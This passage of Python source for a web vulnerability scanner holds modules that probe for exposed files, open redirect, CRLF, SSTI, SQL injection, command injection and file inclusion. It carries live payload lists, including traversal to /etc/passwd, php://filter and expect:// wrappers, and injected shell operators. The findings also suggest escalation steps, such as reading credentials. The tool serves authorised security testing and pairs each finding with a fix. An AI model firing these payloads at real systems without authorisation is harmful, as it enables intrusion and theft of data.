                        "passwords, API keys and internal hostnames.",
                        "Disable or authenticate actuator endpoints and expose only health/info "
                        "on the management port.",
                        ["Check /actuator, /actuator/health and /actuator/heapdump for more data.",
                         "Rotate credentials visible in the environment."],
                    )

        if path == "/web.config":
            if "<configuration" in lowered or "<system.web" in lowered:
                return self._finding(
                    path, endpoint, "Exposed web.config", "HIGH",
                    f"{len(body)} bytes of ASP.NET configuration (values redacted)",
                    "web.config can contain connection strings, machine keys and authentication "
                    "settings.",
                    "Block .config files from static serving and rotate leaked keys and credentials.",
                )

        if path == "/phpinfo.php":
            if "php version" in lowered or "phpinfo()" in lowered:
                return self._finding(
                    path, endpoint, "phpinfo() exposed", "HIGH",
                    f"{len(body)} bytes of PHP configuration",
                    "phpinfo() discloses the PHP version, loaded modules, absolute paths, "
                    "environment variables and sometimes credentials.",
                    "Remove phpinfo scripts from production and disable display of configuration.",
                    ["Use the disclosed version and modules to target known CVEs."],
                )

        if path == "/.DS_Store":
            if body.startswith("Bud1") or "\x00\x00\x00\x01Bud1" in body:
                return self._finding(
                    path, endpoint, "macOS .DS_Store exposed", "LOW",
                    "DS_Store magic header present",
                    "The file lists directory entries, helping enumerate hidden files and folders.",
                    "Block .DS_Store at the web server and remove it from deployments.",
                )

        return None

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        bases = self._bases()

        # Soft-404 baseline: random path at the origin root.
        probe_url = urljoin(bases[0], f"vapf-exposure-{rand_token()}")
        soft = self.t.http.get(probe_url)
        if soft.error:
            self.console.warn("exposure: soft-404 baseline failed; comparisons are weaker")
            soft = None
        else:
            self.console.info(f"exposure: soft-404 baseline {soft.status} / {soft.length}B")

        for path in self.FILES:
            if path == "/graphql" and "graphql" in (self.t.args.modules or []):
                continue  # the dedicated module gives a richer result
            finding = None
            for base in bases:
                url = self._url(path, base)
                resp = self._probe(url)
                if resp.error:
                    continue
                if soft is not None:
                    if resp.status == soft.status and resp.digest == soft.digest:
                        continue
                    if resp.status == soft.status and similarity(resp.text, soft.text) > 0.98:
                        self.console.debug(f"exposure: {path} matches soft-404; skipped")
                        continue
                if resp.status in (404, 410) or not resp.ok:
                    continue
                finding = self._classify(path, resp, url)
                if finding:
                    self.console.warn(f"exposure: {finding.title} at {url}")
                    findings.append(finding)
                    break
                self.console.debug(f"exposure: {path} -> {resp.status} but no signature matched")

        # GraphQL is used as an API here even though its own module exists: this
        # check only answers "is the endpoint there", not "what is in the schema".
        if "graphql" not in (self.t.args.modules or []):
            for base in bases:
                gql_url = self._url("/graphql", base)
                gql = self.t.http.post(
                    gql_url,
                    json={"query": "{__typename}"},
                    headers={"Content-Type": "application/json", "Accept": "application/json"},
                )
                if gql.ok and ("__typename" in gql.text or re.search(r'"errors"\s*:', gql.text)):
                    self.console.warn(f"exposure: GraphQL endpoint reachable at {gql_url}")
                    findings.append(
                        self._finding(
                            "/graphql", gql_url, "GraphQL endpoint reachable", "INFO",
                            gql.snippet("__typename") or gql.text[:200],
                            "A GraphQL endpoint responds at a well-known path. Schema and "
                            "authorisation testing belong to the dedicated graphql module.",
                            "Disable introspection in production and authorise every field server-side.",
                            ["Run: nightfalllx -u <target> --modules graphql"],
                        )
                    )
                    break

        for directory in self.DIRECTORIES:
            for base in bases:
                url = self._url(directory, base)
                use_baseline = directory == "/" and base == bases[0] and self.t.baseline
                resp = self.t.baseline if use_baseline else self.t.http.get(url)
                if resp.error or not resp.ok:
                    continue
                if re.search(r"Index of /|Directory listing for", resp.text, re.I):
                    if directory != "/" and soft is not None and resp.digest == soft.digest:
                        continue
                    self.console.warn(f"exposure: directory listing at {url}")
                    findings.append(
                        self._finding(
                            directory, url, "Directory listing enabled", "MEDIUM",
                            resp.snippet("Index of /") or resp.snippet("Directory listing for"),
                            "The server lists directory contents, which reveals files that are not "
                            "linked anywhere and makes backup/config discovery trivial.",
                            "Disable autoindex/Options +Indexes and add an index file.",
                            ["Enumerate the listed files; check for archives, source and dotfiles."],
                        )
                    )
                    break

        return findings


# ---------------------------------------------------------------------------
# 8.4 OPEN REDIRECT / CRLF
# ---------------------------------------------------------------------------
class RedirectModule(Module):
    """
    Open redirect and CRLF injection.

    Open redirect is confirmed only when the server puts an attacker host in a
    Location header. A payload echoed in the body or in an error string is not a
    redirect, and is intentionally not reported.

    CRLF is confirmed only when the injected marker appears as an actual response
    header (Set-Cookie or the injected header name), not in the body. The raw
    value is sent without re-encoding because %0d%0a must reach the server as a
    control sequence, not as the literal text "%250d%250a".
    """

    name = "redirect"
    description = "Open redirect (Location header) and CRLF/response-splitting probes"

    REDIRECT_PARAM_RE = re.compile(
        r"(?:^|_)(?:url|uri|next|redirect|return|returnto|returnurl|continue|"
        r"dest|destination|target|redir|goto|forward|callback)(?:$|_)",
        re.I,
    )
    REDIRECT_PAYLOADS = ["//evil.com", "https://evil.com", "http://evil.com", "///evil.com"]
    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie: crlf={marker}",
        "%0aSet-Cookie: crlf={marker}",
        "%0d%0aX-Injected: {marker}",
    ]

    def _redirect_params(self) -> List[str]:
        params = [p for p in self.t.params if self.REDIRECT_PARAM_RE.search(p)]
        for extra in self.t.args.param or []:
            if extra not in params:
                params.append(extra)
        return params

    @staticmethod
    def _is_evil_location(location: str, base_url: str) -> bool:
        if not location:
            return False
        resolved = urljoin(base_url, location)
        host = (urlparse(resolved).hostname or "").lower()
        return host == "evil.com" or host.endswith(".evil.com")

    @staticmethod
    def _header_contains(resp: Resp, needle: str) -> bool:
        for key, value in resp.headers.items():
            if needle.lower() in (key or "").lower() or needle.lower() in (value or "").lower():
                return True
        return False

    def _open_redirect(self) -> List[Finding]:
        findings: List[Finding] = []
        params = self._redirect_params()
        if not params:
            self.console.info("redirect: no redirect-like parameter found "
                              "(names checked: url, next, redirect, return, dest, target...)")
            return findings

        baseline_location = header_get(self.t.baseline, "Location") if self.t.baseline else ""
        for param in params:
            self.console.info(f"redirect: probing parameter {param!r}")
            hit = False
            for payload in self.REDIRECT_PAYLOADS:
                resp, desc = self.t.inject(param, payload)
                location = header_get(resp, "Location")
                if not location or not self._is_evil_location(location, self.t.url):
                    continue
                if baseline_location and self._is_evil_location(baseline_location, self.t.url):
                    continue
                self.console.crit(f"redirect: open redirect via {param!r} -> {location}")
                findings.append(
                    Finding(
                        module=self.name,
                        title=f"Open redirect via parameter {param!r}",
                        severity="MEDIUM",
                        endpoint=desc,
                        parameter=param,
                        payload=payload,
                        evidence=f"Location: {location[:300]}",
                        detail=(
                            "The endpoint redirects to a host taken from request data. In a "
                            "phishing flow the link starts on the trusted domain but lands on an "
                            "attacker site; in an OAuth/login flow the same primitive can leak "
                            "codes or tokens if the redirect target is trusted by a provider."
                        ),
                        remediation=(
                            "Do not redirect to arbitrary input. Allow-list relative paths or "
                            "explicit hosts, resolve the target and reject anything outside the "
                            "trusted set, and never rely on string prefix checks ('starts with "
                            "https://trusted.com') because of the @ and subdomain tricks."
                        ),
                        references=["https://portswigger.net/web-security/oauth"],
                        next_steps=[
                            "Check whether the redirect is used by login, OAuth or password-reset "
                            "flows; that decides whether token theft is possible.",
                            "Test the bypass set: //host, /\\host, https://trusted.com@evil.com and "
                            "double-encoded values.",
                        ],
                        request=request_label(desc),
                    )
                )
                hit = True
                break
            if not hit:
                self.console.debug(f"redirect: {param!r} did not produce an external Location")

        return findings

    def _crlf(self) -> List[Finding]:
        findings: List[Finding] = []
        params = self._redirect_params() or list(self.t.params)
        baseline_headers = dict(self.t.baseline.headers) if self.t.baseline else {}

        targets: List[Tuple[str, str]] = []
        for param in params:
            for payload in self.CRLF_PAYLOADS:
                marker = "vapfcrlf" + rand_token(6)
                targets.append((f"param:{param}", set_query_param_raw(
                    self.t.url, param, payload.format(marker=marker)), marker))
        # Path-based injection is independent of parameters.
        parts = urlparse(self.t.url)
        for payload in self.CRLF_PAYLOADS:
            marker = "vapfcrlf" + rand_token(6)
            injected_path = parts.path.rstrip("/") + "/" + payload.format(marker=marker)
            raw_url = urlunparse(parts._replace(path=injected_path, query=parts.query))
            targets.append(("path", raw_url, marker))

        for where, url, marker in targets:
            resp = self.t.http.get(url)
            if resp.error:
                continue
            already = any(marker.lower() in (v or "").lower() for v in baseline_headers.values())
            if already:
                continue
            if self._header_contains(resp, marker):
                self.console.crit(f"redirect: CRLF header injection via {where}")
                findings.append(
                    Finding(
                        module=self.name,
                        title="CRLF injection / HTTP response splitting",
                        severity="HIGH",
                        endpoint=url,
                        parameter=where,
                        payload=url,
                        evidence=f"injected marker {marker!r} appeared in response headers; "
                                 f"Set-Cookie: {header_get(resp, 'Set-Cookie')[:200] or 'n/a'}",
                        detail=(
                            "User input reaches a response header without CR/LF sanitisation. "
                            "An attacker can inject arbitrary headers and, when the response is "
                            "cached, split the response to poison other users' sessions."
                        ),
                        remediation=(
                            "Reject CR, LF and percent-encoded CR/LF in values used in headers; "
                            "use a framework API that encodes header values, and never build "
                            "headers by concatenating request data."
                        ),
                        references=["https://owasp.org/www-community/attacks/HTTP_Response_Splitting"],
                        next_steps=[
                            "Try to set a second cookie or redirect header to prove full response "
                            "splitting rather than a single echoed header.",
                            "Check whether the response is cacheable; that elevates this to cache "
                            "poisoning.",
                        ],
                        request=request_label(url),
                    )
                )
                break

        return findings

    def run(self) -> List[Finding]:
        findings = self._open_redirect()
        findings.extend(self._crlf())
        return findings


# ---------------------------------------------------------------------------
# 8.5 SSTI
# ---------------------------------------------------------------------------
class SSTIModule(Module):
    """
    Server-Side Template Injection detection.

    The method that produces zero false positives is *differential arithmetic*:

      1. Send an expression whose result does not appear anywhere in the payload
         (7*7 -> 49). If "49" appears in the response, the engine evaluated it.
      2. Confirm with a second, different expression (1337*3 -> 4011). A page
         that happens to echo "49" back will fail this step.
      3. Only then classify the engine, and stop. We do not chain to RCE: the
         point of the finding is that the input reaches the engine, and the
         report says what an operator would do next.
    """

    name = "ssti"
    description = "Template engine fingerprint + differential {{7*7}} / ${7*7} / <%= 7*7 %> probes"

    # (family label, probe template, confirmed-product arithmetic)
    # Every family gets the same arithmetic so the confirmation logic is uniform.
    FAMILIES: List[Tuple[str, str, str]] = [
        ("Jinja2 / Twig / Smarty", "{{7*7}}", "49"),
        ("Freemarker / JSP EL / Spring", "${7*7}", "49"),
        ("Thymeleaf (inline)", "[[${7*7}]]", "49"),
        ("ERB / EJS", "<%= 7*7 %>", "49"),
        ("Ruby interpolation", "#{7*7}", "49"),
        ("Velocity", "#set($v=7*7)$v", "49"),
    ]

    # Second, independent expression per family: proves it is arithmetic and not
    # a coincidence. 1337*3 = 4011 appears nowhere in the payload.
    CONFIRM: List[Tuple[str, str, str]] = [
        ("Jinja2 / Twig / Smarty", "{{1337*3}}", "4011"),
        ("Freemarker / JSP EL / Spring", "${1337*3}", "4011"),
        ("Thymeleaf (inline)", "[[${1337*3}]]", "4011"),
        ("ERB / EJS", "<%= 1337*3 %>", "4011"),
        ("Ruby interpolation", "#{1337*3}", "4011"),
        ("Velocity", "#set($v=1337*3)$v", "4011"),
    ]

    def _probe(self, url: str, param: str, payload: str) -> Tuple[Resp, str]:
        # `url` is kept in the signature because the caller always passes the
        # target URL; Target.inject decides query vs form vs JSON.
        return self.t.inject(param, payload)

    @staticmethod
    def _evaluated(resp: Resp, expected: str, payload: str) -> bool:
        """True only if the product appears as a standalone number and the raw
        payload does not (a reflected payload is not an evaluated one)."""
        if resp.error or not resp.text:
            return False
        if payload.strip() and payload.strip() in resp.text:
            return False
        return re.search(rf"(?<!\d){re.escape(expected)}(?!\d)", resp.text) is not None

    def _refine_engine(self, url: str, param: str, family: str) -> str:
        """
        Distinguish engines within a family using their *behaviour*, not headers:
        Jinja2 evaluates 7*'7' to a repeated string, Twig raises on it. Both are
        useful because the exploitation technique differs.
        """
        if family.startswith("Jinja2"):
            r, _ = self._probe(url, param, "{{7*'7'}}")
            if r.ok and "7777777" in r.text:
                return "Jinja2"
            if r.ok and re.search(r"(?<!\d)49(?!\d)", r.text):
                return "Twig"
            if r.status >= 500:
                return "Twig 3.x"
        if family.startswith("Freemarker"):
            r, _ = self._probe(url, param, "${7*'7'}")
            if r.status >= 500:
                return "Freemarker (failed on string coercion)"
        return family

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        for param in self.t.params:
            self.console.info(f"ssti: probing parameter {param!r}")
            for family, probe, expected in self.FAMILIES:
                resp, url = self._probe(self.t.url, param, probe)
                if not self._evaluated(resp, expected, probe):
                    continue

                # Step 2: independent confirmation before we call it a finding.
                confirm_tpl = next((c for f, c, _ in self.CONFIRM if f == family), None)
                if not confirm_tpl:
                    continue
                c_resp, _ = self._probe(self.t.url, param, confirm_tpl)
                if not self._evaluated(c_resp, "4011", confirm_tpl):
                    self.console.debug(f"ssti: {family} matched once but failed confirmation (likely reflection)")
                    continue

                engine = self._refine_engine(self.t.url, param, family)
                self.console.crit(f"SSTI confirmed: {engine} via parameter {param!r}")
                findings.append(
                    Finding(
                        module=self.name,
                        title=f"Server-Side Template Injection ({engine})",
                        severity="CRITICAL",
                        endpoint=url,
                        parameter=param,
                        payload=probe,
                        evidence=f"sent {probe!r} -> response contained {expected!r}; "
                                 f"confirmation {confirm_tpl!r} -> 4011",
                        detail=(
                            "User input is being compiled as template code rather than passed as "
                            "data. In every engine in this family that escalates from arithmetic to "
                            "arbitrary code or file read, so this is normally a direct path to RCE."
                        ),
                        remediation=(
                            "Do not build templates from user input. Pass values as data into a "
                            "static template (render_template('x.html', name=value)). If dynamic "
                            "templates are unavoidable, use a sandboxed environment (Jinja2 "
                            "SandboxedEnvironment) and an allow-list of variables."
                        ),
                        references=[
                            "https://portswigger.net/web-security/server-side-template-injection",
                            "https://owasp.org/www-project-top-ten/",
                        ],
                        next_steps=[
                            f"Enumerate the engine's object graph from parameter {param!r} "
                            "(Jinja2: {{config}}, {{self.__init__.__globals__}}) to demonstrate impact.",
                            "If the engine supports it, attempt file read to prove data exposure.",
                            "Document the exact injection point and the render call responsible.",
                        ],
                        request=request_label(url),
                    )
                )
                break  # one confirmed engine per parameter is enough

            # Blind SSTI: a 500 where the baseline was 200, caused by a bare
            # delimiter, means the input reached the parser even if nothing echoed.
            if not any(f.parameter == param for f in findings):
                r, url = self._probe(self.t.url, param, "{{7*7}}")
                if r.status >= 500 and self.t.baseline and self.t.baseline.status < 400:
                    findings.append(
                        Finding(
                            module=self.name,
                            title="Possible blind SSTI (parser error on template syntax)",
                            severity="MEDIUM",
                            endpoint=url,
                            parameter=param,
                            payload="{{7*7}}",
                            evidence=f"baseline {self.t.baseline.status} -> injected {r.status}; "
                                     f"{r.snippet('error')}",
                            detail="The delimiter changed the server's behaviour without being "
                                   "reflected, which suggests input reaches a template parser but "
                                   "the output is not returned to the client. Treat as unconfirmed.",
                            remediation="Same as confirmed SSTI: never compile user input as a template.",
                            next_steps=[
                                "Try time-based confirmation: a long template loop or a heavy "
                                "expression should measurably increase response time.",
                                "Check application logs for a stack trace naming the template engine.",
                            ],
                            request=request_label(url),
                        )
                    )
        return findings


# ---------------------------------------------------------------------------
# 8.3 SQL INJECTION
# ---------------------------------------------------------------------------
class SQLiModule(Module):
    """
    Two independent signals, both differential:

      * Error-based: send a syntax-breaking character and look for a DBMS error
        string in the body. High confidence, but only fires on apps that leak errors.
      * Boolean-based: compare `X AND 1=1` against `X AND 1=2`. If the true
        branch matches the baseline and the false branch does not, the boolean
        is being evaluated by the database.
      * Time-based: one SLEEP probe, confirmed by doubling the delay.

    sqlmap is then used as a second opinion in detection-only mode.
    """

    name = "sqli"
    description = "Error / boolean / time-based probes, plus detection-only sqlmap"

    # DBMS error signatures. Keep these specific: a bare "error" string is noise.
    ERROR_SIGNATURES = [
        (r"SQL syntax.*MySQL", "MySQL"),
        (r"You have an error in your SQL syntax", "MySQL/MariaDB"),
        (r"Warning.*\Wmysqli?_", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"SQLSTATE\[\w+\]", "generic ODBC/PDO"),
        (r"unrecognized token:|SQLITE_ERROR", "SQLite"),
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"pg_query\(\)|unterminated quoted string", "PostgreSQL"),
        (r"Microsoft OLE DB Provider for SQL Server", "MSSQL"),
        (r"Unclosed quotation mark after the character string", "MSSQL"),
        (r"ORA-\d{4,5}", "Oracle"),
        (r"SQLite/JDBCDriver|sqlite3\.OperationalError|near \".*\": syntax error", "SQLite"),
        (r"ODBC SQL Server Driver", "MSSQL"),
        (r"quoted string not properly terminated", "Oracle"),
    ]

    BREAKERS = ["'", '"', "\\", "')", "';"]

    def _get(self, param: str, value: str) -> Tuple[Resp, str]:
        return self.t.inject(param, value)

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        baseline = self.t.baseline

        for param in self.t.params:
            self.console.info(f"sqli: probing parameter {param!r}")
            original = self.t.original_value(param, "1")
            confirmed = False

            # --- error-based ------------------------------------------------
            for breaker in self.BREAKERS:
                resp, url = self._get(param, f"{original}{breaker}")
                if resp.error:
                    continue
                for pattern, dbms in self.ERROR_SIGNATURES:
                    if re.search(pattern, resp.text, re.I):
                        self.console.crit(f"sqli: {dbms} error from parameter {param!r}")
                        findings.append(
                            Finding(
                                module=self.name,
                                title=f"SQL injection ({dbms}, error-based)",
                                severity="CRITICAL",
                                endpoint=url,
                                parameter=param,
                                payload=breaker,
                                evidence=resp.snippet(re.search(pattern, resp.text, re.I).group(0)),
                                detail=(
                                    f"Injecting {breaker!r} produced a {dbms} error, so the value is "
                                    "concatenated into SQL. From here an attacker controls the query "
                                    "structure: authentication bypass, UNION extraction, and often "
                                    "file read or write depending on database privileges."
                                ),
                                remediation=(
                                    "Use parameterised queries for every value, including ORDER BY "
                                    "and table names (which need allow-listing, not binding). "
                                    "Disable detailed database errors in production responses."
                                ),
                                references=[
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                                ],
                                next_steps=[
                                    "Determine column count with ORDER BY / UNION NULL probing.",
                                    "Enumerate schema through information_schema to establish impact.",
                                    "Check whether the DB user holds FILE privileges (file read/write).",
                                ],
                                request=request_label(url),
                            )
                        )
                        confirmed = True
                        break
                if confirmed:
                    break

            # --- boolean-based ---------------------------------------------
            if not confirmed:
                true_r, true_url = self._get(param, f"{original} AND 1=1")
                false_r, false_url = self._get(param, f"{original} AND 1=2")
                if baseline and true_r.ok and false_r.ok:
                    delta = abs(true_r.length - false_r.length)
                    true_sim = similarity(baseline.text, true_r.text)
                    # Require: true branch looks like the page, false branch is
                    # materially different, and the difference is not tiny.
                    if true_sim > 0.9 and similarity(baseline.text, false_r.text) < 0.85 and delta > 20:
                        self.console.crit(f"sqli: boolean differential on {param!r} ({delta}B)")
                        findings.append(
                            Finding(
                                module=self.name,
                                title="SQL injection (boolean-based)",
                                severity="HIGH",
                                endpoint=false_url,
                                parameter=param,
                                payload=f"{original} AND 1=1  /  {original} AND 1=2",
                                evidence=f"baseline {baseline.length}B, 1=1 -> {true_r.length}B "
                                         f"(similarity {true_sim:.2f}), 1=2 -> {false_r.length}B "
                                         f"(similarity {similarity(baseline.text, false_r.text):.2f})",
                                detail="The true predicate returned the normal page and the false "
                                       "predicate did not, so the database is evaluating injected SQL "
                                       "logic even though no error is displayed.",
                                remediation="Parameterise the query; do not concatenate request values.",
                                next_steps=[
                                    "Extract data one bit at a time (boolean blind) to prove scope.",
                                    "Confirm with sqlmap -u <url> --batch --technique=B.",
                                ],
                                request=request_label(true_url),
                            )
                        )
                        confirmed = True

            # --- time-based -------------------------------------------------
            if not confirmed:
                t0 = time.time()
                sleep_r, sleep_url = self._get(param, f"{original}' AND (SELECT 1 FROM (SELECT SLEEP(4))a)-- -")
                slept = time.time() - t0
                if not sleep_r.error and slept >= 3.5 and baseline and baseline.elapsed < 1.5:
                    # Confirm with a longer delay: a slow query is not good enough.
                    t1 = time.time()
                    _, sleep_url2 = self._get(param, f"{original}' AND (SELECT 1 FROM (SELECT SLEEP(8))a)-- -")
                    slept2 = time.time() - t1
                    if slept2 >= 7.0:
                        self.console.crit(f"sqli: time-based blind on {param!r} ({slept2:.1f}s)")
                        findings.append(
                            Finding(
                                module=self.name,
                                title="SQL injection (time-based blind)",
                                severity="HIGH",
                                endpoint=sleep_url2,
                                parameter=param,
                                payload=f"{original}' AND (SELECT 1 FROM (SELECT SLEEP(8))a)-- -",
                                evidence=f"baseline {baseline.elapsed:.2f}s; SLEEP(4) -> {slept:.2f}s; "
                                         f"SLEEP(8) -> {slept2:.2f}s",
                                detail="Response time tracks the injected SLEEP duration, so the query "
                                       "is executed and its result is not visible to the client.",
                                remediation="Parameterise the query. The same input that sleeps can "
                                            "exfiltrate data through timing.",
                                next_steps=[
                                    "Extract a single bit (e.g. substring of version()) via timing to "
                                    "prove data access.",
                                    "Automate with sqlmap --technique=T --batch.",
                                ],
                                request=request_label(sleep_url2),
                            )
                        )
                        confirmed = True

            # --- sqlmap second opinion --------------------------------------
            if not confirmed and self.t.args.sqlmap:
                location = self.t.location_for(param)
                if location == "json":
                    self.console.info("sqli: sqlmap skipped for a JSON parameter; "
                                      "run it manually with --data / a request file")
                    continue
                if location == "form":
                    probe_url = self.t.url
                    sqlmap_method = self.t.method if self.t.method != "GET" else "POST"
                    body = dict(self.t.form)
                    body[param] = original
                    probe_desc = f"{sqlmap_method} {probe_url} [form]"
                    vulnerable, out = self.t.tools.sqlmap(
                        probe_url, self.t.loot / "sqlmap",
                        method=sqlmap_method,
                        data=urlencode(body),
                    )
                else:
                    probe_url = set_query_param(self.t.url, param, original)
                    probe_desc = probe_url
                    vulnerable, out = self.t.tools.sqlmap(probe_url, self.t.loot / "sqlmap")
                if vulnerable:
                    m = re.search(r"Parameter: (.*?)\n.*?Type: (.*?)\n", out, re.S)
                    findings.append(
                        Finding(
                            module=self.name,
                            title="SQL injection (sqlmap confirmed)",
                            severity="HIGH",
                            endpoint=probe_url,
                            parameter=param,
                            payload="sqlmap --technique=BE --level=2 --risk=1",
                            evidence=(m.group(0).strip() if m else "sqlmap reported the parameter as vulnerable"),
                            detail="sqlmap independently confirmed the parameter is injectable. See "
                                   "loot/sqlmap/ for the full session log including payloads and technique.",
                            remediation="Parameterise the query; add a WAF rule only as defence in depth, "
                                        "never as the primary fix.",
                            next_steps=[
                                "Review loot/sqlmap/ for the confirmed technique and DBMS banner.",
                                "Run extraction manually under the rules of engagement to size the exposure.",
                            ],
                            request=request_label(probe_desc),
                        )
                    )
        return findings


# ---------------------------------------------------------------------------
# 8.4 COMMAND INJECTION
# ---------------------------------------------------------------------------
class CMDiModule(Module):
    """
    Command injection detection with two harm-free signals:

      * Reflection: `; echo <random-token>` -- if the token appears, the shell ran
        `echo`. This executes a command, but `echo` is incapable of side effects.
      * Timing: `; sleep N` with a *doubled* confirmation. The first probe only
        proves the endpoint got slower; a slow endpoint gets slower under load.
        The second, longer sleep is what makes the finding defensible.

    No payload here writes files, opens sockets or exfiltrates anything.
    """

    name = "cmdi"
    description = "Reflection (echo marker) and confirmed time-based (sleep) probes"

    OPERATORS = [";", "|", "&&", "||", "`", "$("]
    LINUX_TIMING = ["sleep 5", "sleep 7"]

    def _get(self, param: str, value: str) -> Tuple[Resp, str]:
        return self.t.inject(param, value)

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        baseline = self.t.baseline

        for param in self.t.params:
            self.console.info(f"cmdi: probing parameter {param!r}")
            original = self.t.original_value(param, "127.0.0.1")
            hit = False

            # --- reflection ------------------------------------------------
            # The marker is split by an empty quoted string: the shell concatenates
            # `vp2a4` + `` + `1pugvu0z` into `vp2a41pugvu0z`, but that contiguous
            # string never appears in the request. So an app that merely echoes the
            # payload back cannot produce it -- only an executing shell can. This is
            # what separates a real hit from a reflected-payload false positive.
            marker = "vp" + rand_token(10) + "z"
            shell_expr = f"{marker[:5]}''{marker[5:]}"
            for op in self.OPERATORS:
                for sep in ("", " "):
                    inner = f"echo {shell_expr}"
                    if op == "`":
                        inner, closing = f"`{inner}", "`"
                    elif op == "$(":
                        inner, closing = f"$({inner}", ")"
                    else:
                        closing = ""
                    payload = f"{original}{op}{sep}{inner}{closing}"
                    resp, url = self._get(param, payload)
                    if resp.ok and marker in resp.text and shell_expr not in resp.text:
                        self.console.crit(f"cmdi: echo marker reflected via {op!r} on {param!r}")
                        findings.append(
                            Finding(
                                module=self.name,
                                title="OS command injection (reflected)",
                                severity="CRITICAL",
                                endpoint=url,
                                parameter=param,
                                payload=payload,
                                evidence=resp.snippet(marker),
                                detail=(
                                    f"The shell executed `echo` and its output reached the response "
                                    f"(marker {marker} appeared in the body). Command injection with "
                                    "output means full command execution as the web user."
                                ),
                                remediation=(
                                    "Never build a shell string from request data. Use an API that "
                                    "takes an argument vector (subprocess.run([...], shell=False)), "
                                    "and allow-list any value passed in (e.g. an IP must parse as an IP)."
                                ),
                                references=[
                                    "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
                                ],
                                next_steps=[
                                    "Establish impact with harmless commands (id, hostname, uname -a).",
                                    "Check whether the web user can read application config or the DB.",
                                    "Test whether egress filtering blocks a reverse shell before trying one.",
                                ],
                                request=request_label(url),
                            )
                        )
                        hit = True
                        break
                if hit:
                    break

            # --- timing ----------------------------------------------------
            if not hit:
                base_elapsed = baseline.elapsed if baseline else 0.5
                payload = f"{original}; sleep 5"
                t0 = time.time()
                r1, url1 = self._get(param, payload)
                first = time.time() - t0
                if not r1.error and first >= base_elapsed + 3.5:
                    payload2 = f"{original}; sleep 7"
                    t1 = time.time()
                    r2, url2 = self._get(param, payload2)
                    second = time.time() - t1
                    if not r2.error and second >= base_elapsed + 5.5:
                        self.console.crit(f"cmdi: time-based blind on {param!r} ({second:.1f}s)")
                        findings.append(
                            Finding(
                                module=self.name,
                                title="OS command injection (time-based blind)",
                                severity="CRITICAL",
                                endpoint=url2,
                                parameter=param,
                                payload=payload2,
                                evidence=f"baseline {base_elapsed:.2f}s; sleep 5 -> {first:.2f}s; "
                                         f"sleep 7 -> {second:.2f}s",
                                detail=(
                                    "Response time increased in proportion to the injected sleep "
                                    "duration, twice, so the shell is executing injected commands even "
                                    "though their output is not returned."
                                ),
                                remediation=(
                                    "Remove shell invocation entirely where possible; otherwise pass "
                                    "arguments as a list and validate against a strict allow-list."
                                ),
                                next_steps=[
                                    "Confirm with output-based injection (echo marker) in a different "
                                    "parameter or header, in case output is swallowed here.",
                                    "Measure jitter with repeated probes before drawing conclusions on a "
                                    "loaded target.",
                                ],
                                request=request_label(url2),
                            )
                        )
        return findings


# ---------------------------------------------------------------------------
# 8.5 FILE INCLUSION
# ---------------------------------------------------------------------------
class LFIModule(Module):
    """
    Local file inclusion detection.

    Three layers:
      1. Traversal to /etc/passwd (and Windows equivalents) matched on the file's
         own structure (`root:x:0:0:`), not on a 200 status.
      2. Encoded variants for filters that block `../` literally.
      3. PHP filter wrapper: `php://filter/convert.base64-encode/resource=index.php`
         returns base64, which we decode and check for `<?php`. This is the one
         that works when traversal is blocked but the wrapper is not.

    Read-only: nothing here writes to the target.
    """

    name = "lfi"
    description = "Baseline-differential traversal, encoded variants, php://filter wrapper"

    PASSWD_MARKERS = [r"root:.*:0:0:", r"\[boot loader\]", r"daemon:.*:/usr/sbin"]
    TRAVERSALS = [
        "../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "../../../../windows/win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
    ]
    WRAPPERS = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "expect://id",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    ]

    def _get(self, param: str, value: str) -> Tuple[Resp, str]:
        return self.t.inject(param, value)

    def _decode_php(self, text: str) -> Optional[str]:
        """Find a long base64 blob in the body and decode it; return PHP source if found."""
        for blob in re.findall(r"[A-Za-z0-9+/]{60,}={0,2}", text):
            try:
                decoded = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
                snippet = decoded.decode("utf-8", "ignore")
            except (binascii.Error, ValueError):
                continue
            if "<?php" in snippet or "<?" in snippet:
                return snippet
        return None

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        for param in self.t.params:
            self.console.info(f"lfi: probing parameter {param!r}")
            original = self.t.original_value(param, "index.php")

            # Baseline: a random filename tells us what "file not found" looks like.
            rnd = f"{rand_token()}.txt"
            base_resp, _ = self._get(param, rnd)

            # --- 1/2. plain + encoded traversal ----------------------------
            hit = False
            for trav in self.TRAVERSALS:
                resp, url = self._get(param, trav)
                if resp.error:
                    continue
                for marker in self.PASSWD_MARKERS:
                    if re.search(marker, resp.text):
                        self.console.crit(f"lfi: traversal succeeded on {param!r}")
                        findings.append(
                            Finding(
                                module=self.name,
                                title="Local File Inclusion (path traversal)",
                                severity="HIGH",
                                endpoint=url,
                                parameter=param,
                                payload=trav,
                                evidence=resp.snippet("root:"),
                                detail=(
                                    "The parameter is used as a filesystem path without sanitisation. "
                                    "Anything the web user can read becomes readable to an attacker: "
                                    "application source, config with DB credentials, SSH keys, "
                                    "/proc/self/environ."
                                ),
                                remediation=(
                                    "Do not accept file paths from users. Map an identifier to a fixed "
                                    "allow-list of files, resolve with realpath() and verify the result "
                                    "is inside the intended directory before reading."
                                ),
                                references=[
                                    "https://owasp.org/www-community/attacks/Path_Traversal"
                                ],
                                next_steps=[
                                    "Read application source via php://filter to look for more bugs and "
                                    "hard-coded credentials.",
                                    "Check /proc/self/environ and app config for secrets.",
